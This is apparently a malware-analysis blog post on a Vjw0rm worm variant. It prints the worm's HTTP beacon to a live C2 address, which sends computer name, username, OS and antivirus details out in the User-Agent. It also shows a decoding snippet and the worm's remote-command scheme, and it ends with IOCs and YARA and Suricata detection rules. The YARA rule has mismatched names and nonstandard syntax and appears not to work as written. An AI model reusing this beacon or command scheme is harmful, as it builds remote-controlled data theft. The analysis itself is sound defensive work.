
+++
author = "Fatima Nezhadian"
title = "Vjw0rm hechem0rder2223 Varient"
date = "2023-02-22"
description = "VjW0rm analysis"
tags = [
    "Malware analysis",
]
+++


  

  
VJw0rm is a worm that was first released in November 2016 by its primary author, v_B01 (aka Sliemerez).  [^1] It has different variant in JavaScript, Visual Basic, and powershell. This worm steals some system information and executes some commands from a command and control (C&C) server.
  

## Technical Analysis


  
The technical analysis of the VJw0rm consist of sandbox analysis which is done in an online platfrom (app.any.run). Then the PCAP file of the network traffic is analyzed. As the last step, the  malware script file is analyzed to get more insight on its behavior.



### Sandbox



As the first step the virus was analyzed in the *app.any.run* online platform, which reported some malicious behaviour such as writing to start menu file, connecting to command and control (C&C) server, also several suspicious behaviour such as executing scripts, creating files in user directory, application launching itself, reading computer name was reported.



### PCAP

  

Then the PCAP file related to the malware traffic was analyzed, the followings are some important points in the PCAP file:


By analyzing the HTTP packet, I found out that the malware sends a POST request in which the user-agent header contains unusual information.

The *Host* shows the ip address of the cnc server that the malware communicates with.

  

```http

POST /Vre HTTP/1.1

Accept : */*
Accept-Language : en-US
User-Agent : thechem0rder2223_C4BA3647\USER-PC\admin\Microsoft Windows 7 Professional \undefined\\YES\FALSE\
Accept-Encoding : gzip, deflate
Host : 185.157.162.75:2223
Content-Length : 0
Connection : Keep-Alive
Cache-Control : no-cache
```

*Box1: Content of HTTP request*

  

### Vjw0rm

  

After behavioural analysis in a sandbox and investigating the network traffic /pcap file the malware file is analyzed to learn more about the malware's functionality.

  

#### Deobfuscation

  

For further analysis, I downloaded the zip file of the virus and stored in my directory : `malware_analysis/vjworm/` in my *RemNux* machine

Then checked the type of the file in the terminal:

```bash

 file vjworm.js

 ascii text with very long line and no termination

```

*Box2 :  determining the file type*

  

As the result did not help much, according to its extension, the file type got considered as *JavaScript*.

  

I opened the file in *VScode* environment, as the first step beautified the code using *cyberchef* to read the code  easily.

The code was clearly obfuscated, filled with garbage code, and confusing variable names.

  

I found a big chunk of encoded characters that were executed in the JS code using *eval* function.  As shown below:

```JS

var superString = r(201, 196, 188, 171, 170),

    encodedText = superString[r(207, 188, 194, 174, 173)](/codigo/g, "")[o(676, 685, 696, 661, 674)](/#!/g, "m"),

    decodedText = decodeBase64(encodedText);

  

eval(decodedText);

  

```

*Box3: piece of malware code executing variable in JS*

  

Thus I decoded the chunk instead of executing it and stored in another js file.

  

```JS

  

WScript.Echo(decodedText);

```

*Box4 : decoding the encoded chunk of malware code and printing it*

  

The decoded chunk of characters where another piece JS code. which indicated a lot more information. I analyzed this second piece of code and found that the HTTP POST request is generated and sent in this piece of code.

  

### C2 Communication

  

The `User-Agent` header value actually contains:

1. computer name

2. Username

3. operating system

4. antivirus info

5. if visual basic compiler exists

6. If the system is already infected with the malware

All these information were concatnated in a string such as below:

  

```js

 var user_agent = 'hechem0rder2223'; // Varient String

 user_agent += '\';                 // Delimiter

 user_agent += '<computer-name>';    // Computer Name

 user_agent += '\';                 // Delimiter
 
 user_agent += '<user-name>';        // Username

 user_agent += '\';                 // Delimiter
 
 user_agent += '<operating_system>';   // operating system

 user_agent += '\';                 // Delimiter
 
 user_agent += '<antivirus>';   // AntiVirus

 user_agent += '\';                 // Delimiter

 user_agent += '\';                 // Delimiter
 
 user_agent += '<visual_basic_compiler_exists>';   // True if visual basic compiler exists in the system

 user_agent += '\';                 // Delimiter
 
 user_agent += 'system infected';  
 // The system is already infected
 
 user_agent += '\';                 // Delimiter

```

  


#### C2 Commands


The response format:

``` JavaScript
[command] delimiter [arg1] delimiter [arg2]
```


Based on the system information shared by the malware server through *User-agent* header, the malware receives a response which defines the type of action for it to take, which is one of the following:

1. execute some script sent from server

2. write a shellscript into a file on system and run it

3. quit

  

The table below shows types of commands received from the server and their corresponding actions:

  

|Command| Action|
|------|---------|
|Cl|quit |
|Ex|execute script sent from server|
|Sc| write a script to file and Run it|
|Rf| write a script file on system drive and run it|
|Un| change some information, run the malware script, quit|
|Up| Update the malware script and execute the updated version |
|Rn|write a script file on system drive and run it|


  

##### Cl Command

  
This command forces the script to quit.
  

##### Sc Command


This command writes a script ,received in the http response, to a text file, then executes it.



##### Ex Command


This command executes a piece of code ,received in the http response.


  
  

## Conclusion

  

VjW0rm is a worm that runs in Windows environment. It communicates with a command and control server.  The Malware communicates through http protocol sends user information to the C&C server.




  

## Indicators of Compromise

  

| Type   | Indicator | Description         | 
| ------ | --------- | ------------------- |
| SHA256 | b5d3653f83d46a1b3ee1c4894d05a5a1e\n c0b61d1a3e40dd08aa23d0b269a8f4c| Initial Malware JS file |
| MD5 | 2aac99d65bb07425174cb325bd13df70 | Initial Malware JS file|
| SHA1|5564631e63f009021e8e71c6aec13cb9f58cd621|Initial Malware JS file|
|SHA1| fbeef5598b2c20c9723dca871f56b94873e2e637 | First decoded chunk of the script|
|MD5| 4b51195816557eaad4b13335f27b652e| First decoded chunk of the script|
| SHA256|2babb381fc195703e03a403d8d60c495152\n 7b4f6bec86ad79003ba93ac5a4092 | First decoded chunk of the script|
  

## TTPs

  

| ID                                                  | Tactic    | Technique                         |
| --------------------------------------------------- | --------- | --------------------------------- |
| [T1203](https://attack.mitre.org/techniques/T1203/) | Execution | Exploitation for Client Execution |
| [T1059](https://attack.mitre.org/techniques/T1059/)| Execution| Command and Scripting Interpreter| 
|[T1071](https://attack.mitre.org/techniques/T1071/)|   Command and Control|  Application Layer Protocol |
|[ T1033](https://attack.mitre.org/techniques/T1033/)| Discovery| System Owner/User Discovery|
|[T1082](https://attack.mitre.org/techniques/T1082/)| Discovery| System Information Discovery|
| [T1012](https://attack.mitre.org/techniques/T1012/)|Discovery |  Query Registry|
| [T1083](https://attack.mitre.org/techniques/T1083/)| Discovery|  File and Directory Discovery|

## Detection Signatures

  

### YARA



The YARA rule is defined to detect obfuscated JavaScript  files.


```Yara

{

    meta:
		Description      = "VjW0rm Obfuscation Detection Signature"
		author           = "Fatima Nezhadian"
		date             = "2023-02-07"
		sample_filetype  = "js-html"
		tlp              = "white"

    Strings:
        $eval      = "eval("
        $variable  = "_0x"
        $funcction = /function [a-zA-Z]\x28/
        
    Conditions:
		filesize < 2MB   and
		$eval            and
		#variable  > 4   and
		#function  > 4
  
  

}

```

  

### Suricata

  

The Suricata rules are defined to monitor the traffic and alert when a matching network packet is found.


```Suricata
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"MALWARE Vjw0rm C2 Beacon"; content:"POST"; http_method; 
content:"/Vre"; http_uri; fast_pattern; 
http.user_agent; content:"_"; depth:32; pcre:"/_[A-F0-9]{8}/V"; 
flow:to_server, established; 
reference:url, [https://app.any.run/tasks/77e23c3d-a324-4f67-819a-15be25d75036](https://app.any.run/tasks/77e23c3d-a324-4f67-819a-15be25d75036); 
sid:2000000; rev:1;)
```


References

[^1]:  (https://malpedia.caad.fkie.fraunhofer.de/details/win.vjw0rm)

